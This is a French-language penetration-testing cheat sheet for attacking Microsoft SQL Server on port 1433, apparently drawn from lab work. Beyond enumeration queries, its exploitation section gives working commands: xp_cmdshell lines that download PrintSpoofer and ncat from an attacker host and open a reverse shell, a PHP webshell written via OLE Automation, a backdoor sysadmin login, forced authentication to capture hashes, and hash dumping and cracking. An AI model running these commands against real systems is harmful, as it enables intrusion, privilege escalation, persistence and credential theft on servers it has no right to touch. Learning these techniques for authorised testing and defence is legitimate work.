---
public: true
---

Port : 1433

## Enumeration

### Sans accès initial

#### nmap

```shell-session
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args <mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $TARGET_IP
```

#### metasploit

```shell-session
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248

rhosts => 10.129.201.248


msf6 auxiliary(scanner/mssql/mssql_ping) > run

[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:
[+] 10.129.201.248:       -    ServerName      = SQL-01
[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
[+] 10.129.201.248:       -    IsClustered     = No
[+] 10.129.201.248:       -    Version         = 15.0.2000.5
[+] 10.129.201.248:       -    tcp             = 1433
[+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query
[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Avec accès

Si on dispose d'un accès via un des outils présentés plus bas sur cette page, on pourra utiliser les commandes suivantes pour découvrir l'environnement de base de données accessible.

#### Requêtes utiles

##### Informations générales

```sql
-- Get version
select @@version;
-- Get user
select user_name();
select SYSTEM_USER;
-- List admin users
select name,type_desc,is_disabled FROM master.sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1 ORDER BY name;
-- Check if we are sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin'); -- retourne 0 si nous ne sommes pas membre
--
-- List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;

-- List users that current user can impersonate 
--    if found : we need to impersonate each user available and enumerate again (see Exploitation below to see how to impersonate)
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';


-- List Linked servers
SELECT srvname, isremote FROM sysservers WHERE isremote = 0; -- 0 means linked server
EXEC sp_linkedservers
SELECT * FROM sys.servers;
SELECT name,is_linked,is_remote_login_enabled, FROM sys.servers WHERE isremote = 0; -- 0 means linked server


```

Si un serveur lié (Linked Server) est découvert, on pourra tenter d'y accéder, vérifier si nous disposons de privilèges différents sur celui-ci. Voir la partie `Exploitation` plus bas sur cette page.

##### Exploration de l'instance de base de donnée

```sql
-- Get databases
select name from sys.databases;
SELECT name FROM master.dbo.sysdatabases;

-- Use database
USE master;

-- Get table names
SELECT table_name FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
SELECT table_name FROM INFORMATION_SCHEMA.TABLES; -- si use DBXXX
-- Get columns for table
SELECT COLUMN_NAME FROM <databaseName>.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'MYTABLE';
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'MYTABLE';; -- si use DBXXX
```

## Outils utiles

### Windows

#### sqlcmd

Utilitaire installer avec SQLServer

Il faudra ajouter le mot clé `GO` à chaque requête afin qu'elle soit exécutée.

```shell
# -y 30 -Y 30 augmentent la visibilité des résultat (attention aux performances)
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
# port non standard
sqlcmd -S "127.0.0.1,49730" -U MyDNNUser -P 'MyDNNS3cure'
# ATTENTION : cet utilitaire nécessite la saisie du mot GO à la ligne terminant chaque requête ! (pas besoin de ';' dans cet outil)
```

### Linux

#### sqsh

Equivalent de sqlcmd sous Windows, pour Linux.

Comme sous windows, on ajoutera le mot clé `GO` à chaque requête afin qu'elle soit exécutée.

```bash
# Authentificatino Interne (SQL Server)
sqsh -S $TARGET_IP -U $AD_USER -P $AD_PASSWORD

# Authentification locale ou domaine
sqsh -S $TARGET_IP -U .\\$AD_USER -P $AD_PASSWORD 
```

#### Mssqlclient.py (impacket)

**Attention** : ce client n'accepte pas les requêtes sur plusieurs lignes.

```bash
# Internal Authentication (no fomzin prefix)
mssqlclient.py -p 1433  $USER:$PASS@$TARGET_IP 

# Local workstation authentication 
mssqlclient.py Administrator@10.129.201.248 -windows-auth

# Local workstation account authentication (no need to add WIN-02 to hosts)
mssqlclient.py -p 1433 -windows-auth $AD_DOMAIN$/$AD_USER:"$AD_PASSWORD"@$TARGET_IP

SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
```

## Commandes utiles

### Exploitation

#### Exécution de commandes (xp_cmdshell)

```sql
-- Depuis l'outil Impacket mssqlclient.py
enable_xp_cmdshell -- rien d'autre à taper normalement, la reconfiguration se fait automatiquement

------------------------------------------------------------------------
-- Tentative d activation de xp_cmdshell  (si droits suffisants)
-- Allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE

--  Execution de commande (after enabling it)
xp_cmdshell whoami
xp_cmdshell whoami /priv
xp_cmdshell "powershell iwr http://10.10.14.145:8000/PrintSpoofer64.exe -o c:\windows\temp\PrintSpoofer.exe";
xp_cmdshell "powershell iwr http://10.10.14.145:8000/ncat.exe -o c:\windows\temp\ncat.exe";
xp_cmdshell c:\windows\temp\PrintSpoofer.exe -c "c:\windows\temp\ncat.exe 10.10.14.145 1337 -e cmd";
xp_cmdshell "powershell iwr http://x.x.x.x/ncat.exe -o $($env:Temp)\ncat.exe";

xp_cmdshell powershell -e <hoaxshell payload>;


```

#### Capture de Hash

```sql
-- XP_DIRTREE
EXEC master..xp_dirtree '\\10.10.110.17\share\'
```

```sql
-- XP_SUBDIRS
EXEC master..xp_subdirs '\\10.10.110.17\share\'
```

#### Ecriture dans un fichier

```sql
------------------------------------------------------------------------
-- Creation de fichier via OLE Automation Procedures

-- Activation
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

-- Création de fichier
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```

#### Lecture d'un fichier

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

#### Création de compte

```sql
------------------------------------------------------------------------
-- Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!';
EXEC sp_addsrvrolemember 'hacker', 'sysadmin';
```

#### User Impersonate

Si l'énumération présentée plus haut nous liste des utilisateurs que l'on peut "impersonate" (usurper l'identité), on peut alors utiliser les commandes suivantes :

```sql
-- Exploitation
user master; -- db sur laquelle on est sur d'avoir les droits
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
REVERT; -- retourne aux droits précédents
```

### Linked Server

Si on a un serveur lié (voir énumération sur cette page), on peut exécuter des requêtes à distance sur cette machine :

```sql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
```

There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry.

## Pillage : collecte de hash

### Client MSSql
Les hash des comptes utilisateurs peuvent être extraits via :

```sql
select name,password_hash from sys.sql_logins ;
```

### Nmap

```shell
nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=Password@1 192.168.1.146
```

### PowerUpSQL

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLServerPasswordHash -username sa -Password Password@1 -instance WIN-P83OS778EQK\SQLEXPRESS -Verbose
```

#### Cassage des hash

```shell
john --format=mssql12 --wordlist=pass hash

hashcat -m 1731 hash pass.list # TODO : confirme the syntax
```


## Voir aussi

<https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet>


## Références

- https://www.hackingarticles.in/mssql-for-pentester-hashing/